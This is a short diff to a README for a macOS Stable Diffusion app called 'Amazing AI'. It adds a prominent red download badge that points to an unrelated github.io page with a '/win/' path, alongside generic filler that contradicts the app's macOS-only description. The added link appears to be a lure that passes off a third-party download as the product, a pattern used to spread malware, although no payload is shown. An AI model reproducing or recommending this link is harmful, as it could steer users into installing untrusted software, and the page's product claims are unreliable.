@@ -30,6 +30,12 @@ Amazing AI is a polished macOS app that runs Stable Diffusion locally on Apple S
 
 Whether you're a newcomer or a veteran, Amazing AI provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Amazing AI](https://img.shields.io/badge/⬇_DOWNLOAD_Amazing+AI-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
